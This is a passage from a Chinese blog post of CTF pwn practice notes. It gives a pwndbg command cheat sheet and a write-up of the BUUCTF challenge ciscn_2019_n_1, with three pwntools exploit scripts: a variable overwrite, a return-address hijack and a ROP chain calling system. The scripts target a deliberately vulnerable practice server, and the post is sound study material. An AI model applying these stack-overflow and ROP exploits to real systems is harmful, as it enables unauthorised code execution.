+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">**************************************************
+</span></span><span class="line"><span class="cl">pwndbg&gt; start 
+</span></span><span class="line"><span class="cl"><span class="c1"># 开始运行，会停留在start函数上(start函数是main函数之前的一个函数) </span>
+</span></span><span class="line"><span class="cl">**************************************************
+</span></span><span class="line"><span class="cl">pwndbg&gt; q 
+</span></span><span class="line"><span class="cl"><span class="c1"># 退出调试</span>
+</span></span><span class="line"><span class="cl">**************************************************
+</span></span><span class="line"><span class="cl">pwndbg&gt; r 
+</span></span><span class="line"><span class="cl"><span class="c1"># 从头运行程序直到遇到断点,没有断点则会一直运行到结束</span>
+</span></span><span class="line"><span class="cl">**************************************************
+</span></span><span class="line"><span class="cl">pwndbg&gt; c 
+</span></span><span class="line"><span class="cl"><span class="c1"># 继续执行程序直到遇到断点，没有断点则会一直运行到结束</span>
+</span></span><span class="line"><span class="cl">**************************************************
+</span></span><span class="line"><span class="cl">pwndbg&gt; n 
+</span></span><span class="line"><span class="cl"><span class="c1"># 单步步过，n不会进入一个小函数</span>
+</span></span><span class="line"><span class="cl">**************************************************
+</span></span><span class="line"><span class="cl">pwndbg&gt; ni 
+</span></span><span class="line"><span class="cl"><span class="c1"># 常用，同n，但是是汇编层面的一步</span>
+</span></span><span class="line"><span class="cl">**************************************************
+</span></span><span class="line"><span class="cl">pwndbg&gt; s 
+</span></span><span class="line"><span class="cl"><span class="c1"># 步入，比如遇到一个call 什么什么函数，s会进入看看怎么个事 </span>
+</span></span><span class="line"><span class="cl">**************************************************
+</span></span><span class="line"><span class="cl">pwndbg&gt; si 
+</span></span><span class="line"><span class="cl"><span class="c1"># 常用，同s，但是是汇编层面的一步</span>
+</span></span><span class="line"><span class="cl">**************************************************
+</span></span><span class="line"><span class="cl">pwndbg&gt; fini 
+</span></span><span class="line"><span class="cl"><span class="c1"># 快速运行结束当前函数</span>
+</span></span><span class="line"><span class="cl">**************************************************
+</span></span><span class="line"><span class="cl">pwndbg&gt; context 
+</span></span><span class="line"><span class="cl"><span class="c1"># 重新打印页面信息</span>
+</span></span><span class="line"><span class="cl">**************************************************
+</span></span><span class="line"><span class="cl">pwndbg&gt; b function_name
+</span></span><span class="line"><span class="cl"><span class="c1"># 比如: b read 在read函数上下断点，运行到read函数的时候就会停止</span>
+</span></span><span class="line"><span class="cl">**************************************************
+</span></span><span class="line"><span class="cl">pwndbg&gt; b *<span class="o">(</span><span class="p">&amp;</span>function_name+offset<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 比如: b *(&amp;read + 10) 在read函数+10的地址上下断点，运行到这个地址的时候就会停止</span>
+</span></span><span class="line"><span class="cl">**************************************************
+</span></span><span class="line"><span class="cl">pwndbg&gt; b *0xaddr
+</span></span><span class="line"><span class="cl"><span class="c1"># 比如: b *0x408010 那么程序运行到0x408010这个地址的时候就会停止</span>
+</span></span><span class="line"><span class="cl">**************************************************
+</span></span><span class="line"><span class="cl">pwndbg&gt; i b
+</span></span><span class="line"><span class="cl"><span class="c1"># 查看断点信息，哪些地方打了断点</span>
+</span></span><span class="line"><span class="cl">**************************************************
+</span></span><span class="line"><span class="cl">pwndbg&gt; delete &lt;断点序号&gt;
+</span></span><span class="line"><span class="cl"><span class="c1"># 删除断点序号对应的断点,单独一个delete会删除所有断点</span>
+</span></span><span class="line"><span class="cl">**************************************************
+</span></span><span class="line"><span class="cl">pwndbg&gt; i r
+</span></span><span class="line"><span class="cl"><span class="c1"># 查看所有寄存器中存储的数据</span>
+</span></span><span class="line"><span class="cl">**************************************************
+</span></span><span class="line"><span class="cl">pwndbg&gt; i r &lt;registers&gt;
+</span></span><span class="line"><span class="cl"><span class="c1"># 查看具体某一个寄存器的值 比如: pwndbg&gt; i r rax</span>
+</span></span><span class="line"><span class="cl">**************************************************
+</span></span><span class="line"><span class="cl">pwndbg&gt; stack &lt;int&gt;
+</span></span><span class="line"><span class="cl"><span class="c1"># 查看栈中的信息，具体数量填在stack后面，比如: stack 50</span>
+</span></span><span class="line"><span class="cl">**************************************************
+</span></span><span class="line"><span class="cl">pwndbg&gt; search &lt;string&gt;
+</span></span><span class="line"><span class="cl"><span class="c1"># 在程序中查看字符串，可以查看自己输入的信息被存在什么地方了</span>
+</span></span><span class="line"><span class="cl">**************************************************
+</span></span><span class="line"><span class="cl">pwndbg&gt; <span class="nb">set</span> $&lt;rigister&gt; <span class="o">=</span> &lt;int&gt;
+</span></span><span class="line"><span class="cl"><span class="c1"># 使用set来给寄存器设置自定义的值</span>
+</span></span><span class="line"><span class="cl">**************************************************
+</span></span><span class="line"><span class="cl">pwndbg&gt; bt
+</span></span><span class="line"><span class="cl"><span class="c1"># 查看我们当前这个函数的上一个函数是什么</span>
+</span></span><span class="line"><span class="cl">**************************************************
+</span></span><span class="line"><span class="cl">pwndbg&gt; vmmap
+</span></span><span class="line"><span class="cl"><span class="c1"># 查看程序各个段的位置以及权限等信息</span>
+</span></span><span class="line"><span class="cl">**************************************************
+</span></span><span class="line"><span class="cl">pwndbg&gt; elf
+</span></span><span class="line"><span class="cl"><span class="c1"># 查看elf文件信息</span>
+</span></span><span class="line"><span class="cl">**************************************************
+</span></span><span class="line"><span class="cl">pwndbg&gt; bins
+</span></span><span class="line"><span class="cl"><span class="c1"># 查看释放的堆块</span>
+</span></span><span class="line"><span class="cl">**************************************************
+</span></span><span class="line"><span class="cl">pwndbg&gt; heap
+</span></span><span class="line"><span class="cl"><span class="c1"># 查看正在使用的堆块</span>
+</span></span><span class="line"><span class="cl">**************************************************
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里我们start或者run,注意这里如果刚拖到虚拟机里面的附件要给权限</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">chmod +x warmup_csaw_2016
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里进调试，先生成字符串</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cyclic <span class="m">100</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后run程序，或者先run程序，再生成这个字符串，再按c进行continue就行</p>
+<p>输入后程序会崩掉，可以查看rbp的值，再用cyclic计算偏移量</p>
+<p><img src="/p/pwn%E5%88%B7%E9%A2%98/image-20260209203950982.png"
+	width="1097"
+	height="552"
+	srcset="/p/pwn%E5%88%B7%E9%A2%98/image-20260209203950982_hu6490398236758255835.png 480w, /p/pwn%E5%88%B7%E9%A2%98/image-20260209203950982_hu9694770618461934918.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260209203950982"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="198"
+		data-flex-basis="476px"
+	
+></p>
+<p>这里学习一下x指令和p指令</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># x 命令用于查看内存中的数据。它可以显示指定地址或变量所占内存的内容。</span>
+</span></span><span class="line"><span class="cl">语法如下：x/<span class="o">[</span>n<span class="o">][</span>f<span class="o">][</span>u<span class="o">]</span> addr
+</span></span><span class="line"><span class="cl">n：可选，表示要显示的单元数量，默认为1。
+</span></span><span class="line"><span class="cl">f：可选，表示显示的格式，常见格式包括：
+</span></span><span class="line"><span class="cl">d：十进制整数
+</span></span><span class="line"><span class="cl">x：十六进制
+</span></span><span class="line"><span class="cl">o：八进制
+</span></span><span class="line"><span class="cl">c：字符
+</span></span><span class="line"><span class="cl">f：浮点数
+</span></span><span class="line"><span class="cl">u：可选，表示数据单位，常见单位包括：
+</span></span><span class="line"><span class="cl">b：字节
+</span></span><span class="line"><span class="cl">h：半字（2 字节）
+</span></span><span class="line"><span class="cl">w：字（4 字节）
+</span></span><span class="line"><span class="cl">g：巨字（8 字节）
+</span></span><span class="line"><span class="cl">例子：
+</span></span><span class="line"><span class="cl">x/10x 0x7fffffffe000 <span class="c1"># 将以十六进制格式显示从 0x7fffffffe000 开始的10个字节的内容</span>
+</span></span><span class="line"><span class="cl">x/4d my_array <span class="c1"># 将以十进制格式查看 my_array 数组的前4个元素</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># p 命令用于打印变量的值，通常用于查看变量的当前状态。</span>
+</span></span><span class="line"><span class="cl">语法如下：p <span class="o">[</span>expression<span class="o">]</span>
+</span></span><span class="line"><span class="cl">expression：要打印的变量名或表达式。
+</span></span><span class="line"><span class="cl">例子：
+</span></span><span class="line"><span class="cl">p my_variable <span class="c1"># 将输出 my_variable 的当前值</span>
+</span></span><span class="line"><span class="cl">p <span class="p">&amp;</span>my_variable <span class="c1"># 使用 &amp; 操作符可以打印变量的地址</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="ciscn_2019_n_1">ciscn_2019_n_1
+</h2><p>checksec</p>
+<p><img src="/p/pwn%E5%88%B7%E9%A2%98/image-20260210105039329.png"
+	width="492"
+	height="119"
+	srcset="/p/pwn%E5%88%B7%E9%A2%98/image-20260210105039329_hu9555337992304852573.png 480w, /p/pwn%E5%88%B7%E9%A2%98/image-20260210105039329_hu827590279475548949.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260210105039329"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="413"
+		data-flex-basis="992px"
+	
+></p>
+<p>还是没有栈保护，但是有NX,防止注入shellcode，我们之前的攻击方式都叫做ROP,也就是栈溢出覆盖返回地址</p>
+<p>ida打开看mian函数</p>
+<p><img src="/p/pwn%E5%88%B7%E9%A2%98/image-20260210105247944.png"
+	width="624"
+	height="157"
+	srcset="/p/pwn%E5%88%B7%E9%A2%98/image-20260210105247944_hu14762983481582309840.png 480w, /p/pwn%E5%88%B7%E9%A2%98/image-20260210105247944_hu402418055162593387.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260210105247944"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="397"
+		data-flex-basis="953px"
+	
+></p>
+<p>看func函数</p>
+<p><img src="/p/pwn%E5%88%B7%E9%A2%98/image-20260210105306429.png"
+	width="627"
+	height="335"
+	srcset="/p/pwn%E5%88%B7%E9%A2%98/image-20260210105306429_hu5791713421657853825.png 480w, /p/pwn%E5%88%B7%E9%A2%98/image-20260210105306429_hu17901293433342112724.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260210105306429"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="187"
+		data-flex-basis="449px"
+	
+></p>
+<p>可以发现又一次使用gets，可以栈溢出，这里可以看到当v2等于后面那个数的时候，会执行cat /flag</p>
+<p>所以这里有两种解法，第一种就是直接利用gets的栈溢出，挟持返回地址到system函数执行cat /flag的地方，第二种就是满足v2的条件，同样也是利用栈溢出来修改v2的值</p>
+<p>依旧双击v1变量看看长度</p>
+<p><img src="/p/pwn%E5%88%B7%E9%A2%98/image-20260210105821253.png"
+	width="875"
+	height="217"
+	srcset="/p/pwn%E5%88%B7%E9%A2%98/image-20260210105821253_hu15501688245850147770.png 480w, /p/pwn%E5%88%B7%E9%A2%98/image-20260210105821253_hu5076643933351164344.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260210105821253"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="403"
+		data-flex-basis="967px"
+	
+></p>
+<p>可以看出v1和v2的距离是0x30-0x4,v2的内容只有4字节，因为它是浮点数，通过计算11.28125的16进制是0x41348000，这里把v1填满之后，再填入4字节的数据就会把v2的值覆盖，满足条件后拿到flag</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;node5.buuoj.cn&#34;</span><span class="p">,</span><span class="mi">29089</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x30</span><span class="o">-</span><span class="mh">0x4</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x41348000</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>另一种就找到func函数中执行命令的地址</p>
+<p><img src="/p/pwn%E5%88%B7%E9%A2%98/image-20260210111455664.png"
+	width="1194"
+	height="605"
+	srcset="/p/pwn%E5%88%B7%E9%A2%98/image-20260210111455664_hu11148827141214034417.png 480w, /p/pwn%E5%88%B7%E9%A2%98/image-20260210111455664_hu13062435092832333753.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260210111455664"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="197"
+		data-flex-basis="473px"
+	
+></p>
+<p>可以发现是0x4006BE</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;node5.buuoj.cn&#34;</span><span class="p">,</span><span class="mi">29089</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x30</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x4006BE</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这题也能用ROP来写，先列出gadget</p>
+<p><img src="/p/pwn%E5%88%B7%E9%A2%98/image-20260210163814086.png"
+	width="764"
+	height="345"
+	srcset="/p/pwn%E5%88%B7%E9%A2%98/image-20260210163814086_hu3336682918902071083.png 480w, /p/pwn%E5%88%B7%E9%A2%98/image-20260210163814086_hu14925965142675689056.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260210163814086"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="221"
+		data-flex-basis="531px"
+	
+></p>
+<p>可以发现<code>pop rdi;ret</code>这个gadget,现在我们想要做到的是<code>system('cat /flag')</code></p>
+<p>找system的地址</p>
+<p><img src="/p/pwn%E5%88%B7%E9%A2%98/image-20260210163932217.png"
+	width="814"
+	height="520"
+	srcset="/p/pwn%E5%88%B7%E9%A2%98/image-20260210163932217_hu15387914421472257479.png 480w, /p/pwn%E5%88%B7%E9%A2%98/image-20260210163932217_hu15967609826699724888.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260210163932217"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="156"
+		data-flex-basis="375px"
+	
+></p>
+<p>这里要选择上面那个<code>_system</code>，因为它是plt部分的，是可以执行的system(PLT 位于代码段（.text 段附近），它是 <strong>可执行</strong> 的),而下面那个system,它其实是个存储槽位，它的内存里保存的是 system 函数在内存中的真正起始地址，它是 8 个字节的数据，不是指令，一般用来泄露libc地址</p>
+<p>然后找命令的地址</p>
+<p><img src="/p/pwn%E5%88%B7%E9%A2%98/image-20260210164356516.png"
+	width="1215"
+	height="229"
+	srcset="/p/pwn%E5%88%B7%E9%A2%98/image-20260210164356516_hu3606373014465991298.png 480w, /p/pwn%E5%88%B7%E9%A2%98/image-20260210164356516_hu8257725067231232033.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260210164356516"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="530"
+		data-flex-basis="1273px"
+	
+></p>
+<p>有了这三个地址，我们就能构造ROP了，但是这里system 函数内部会调用一条汇编指令：movaps，movaps 指令要求操作数的地址必须是 <strong>16 字节对齐</strong> 的，如果执行 movaps 时，栈指针（RSP 寄存器）没有对齐到 16 字节，CPU 就会抛出异常，导致程序崩溃，我们如果只用这三个地址，rsp增加3*8不是16的倍数，所以会报错，必须补上一个8字节的指令ret，这个ret的作用就是从栈上弹出一个8字节的地址，然后跳转过去</p>
+<p>所以我们得到</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x38</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">catflag</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>完整exp</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node5.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">26015</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_rdi</span><span class="o">=</span><span class="mh">0x400793</span>
+</span></span><span class="line"><span class="cl"><span class="n">ret</span><span class="o">=</span><span class="mh">0x400501</span>
+</span></span><span class="line"><span class="cl"><span class="n">catflag</span><span class="o">=</span><span class="mh">0x4007cc</span>
+</span></span><span class="line"><span class="cl"><span class="n">system</span><span class="o">=</span><span class="mh">0x400530</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x38</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">catflag</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="pwn1_sctf_2016">pwn1_sctf_2016
+</h2>
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/%E5%88%B7%E9%A2%98/">刷题</a>
+        
+            <a href="/tags/pwn/">Pwn</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under 9u_l3</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/pwn%E8%8A%9D%E5%A3%AB%E5%AD%A6%E7%88%86/">
+        
+        
+            <div class="article-image">
+                <img src="/p/pwn%E8%8A%9D%E5%A3%AB%E5%AD%A6%E7%88%86/1.3fe00905d88742bed963771fdebec97d.jpg" 
+                        width="2300" 
+                        height="1963" 
+                        loading="lazy"
+                        alt="Featured image of post Pwn芝士学爆"
+                        
+                        data-hash="md5-P&#43;AJBdiHQr7ZY3cf3r7JfQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Pwn芝士学爆</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <script src='//unpkg.com/@waline/client@v2/dist/waline.js'></script>
+<link href='//unpkg.com/@waline/client@v2/dist/waline.css' rel='stylesheet'/>
+<div id="waline" class="waline-container"></div>
+<style>
+    .waline-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+        --waline-font-size: var(--article-font-size);
+    }
+    .waline-container .wl-count {
+        color: var(--card-text-color-main);
+    }
+</style><script>
+    
+    Waline.init({"dark":"html[data-scheme=\"dark\"]","el":"#waline","emoji":["https://unpkg.com/@waline/emojis@1.0.1/weibo"],"locale":{"admin":"Admin","placeholder":null},"requiredMeta":["name","email","url"],"serverURL":"https://waline-test-one-smoky.vercel.app"});
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2025 - 
+        
+        2026 无敌可爱美咕噜
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+<style>
+  body {
+    background: url(https://0d000721999.github.io/background/1.webp) no-repeat center top;
+    background-size: cover;
+    background-attachment: fixed;
+  }
+</style>
+
+ 
+<style>
+  @font-face {
+    font-family: 'ss';
+    src: url(https://0d000721999.github.io/font/SeriousShannsNerdFontMono-Regular.otf) format('opentype');
+  }
+
+  :root {
+    --base-font-family: 'ss';
+    --code-font-family: 'ss';
+  }
+</style>
+<style>
+    #TableOfContents > ul, ol {
+        ul, ol {
+            display: none;
+        }
+        .open {
+            display: block;
+        }
+    }
+</style>
+
+<script>
+    function initTocHide() {
+        
+        let toc = document.querySelector(".widget--toc");
+        if (!toc) {
+            return;
+        }
+        
+        window.addEventListener('scroll', function() {
+            
+            let openUl = document.querySelectorAll(".open");
+            if (openUl.length > 0) {
+              openUl.forEach((ul) => {
+                ul.classList.remove("open")
+              })
+            }
+            
+            let currentLi = document.querySelector(".active-class");
+            if (!currentLi) {
+                return
+            }
+            
+            if (currentLi.children.length > 1) {
+                currentLi.children[1].classList.add("open")
+            }
+            
+            let ul = currentLi.parentElement;
+            do {
+                ul.classList.add("open");
+                ul = ul.parentElement.parentElement
+            } while (ul !== undefined && (ul.localName === 'ul' || ul.localName === 'ol'))
+        });
+    }
+    initTocHide()
+</script>
+
+<style>
+    #backTopBtn {
+        display: none;
+        position: fixed;
+        bottom: 30px;
+        z-index: 99;
+        cursor: pointer;
+        width: 30px;
+        height: 30px;
+        background-image: url(https://0d000721999.github.io/icons/backTop.svg);
+    }
+</style>
+
+<script>
+    
+
+    function initScrollTop() {
+        let rightSideBar = document.querySelector(".right-sidebar");
+        if (!rightSideBar) {
+            return;
+        }
+        
+        let btn = document.createElement("div");
+        btn.id = "backTopBtn";
+        btn.onclick = backToTop
+        rightSideBar.appendChild(btn)
+        
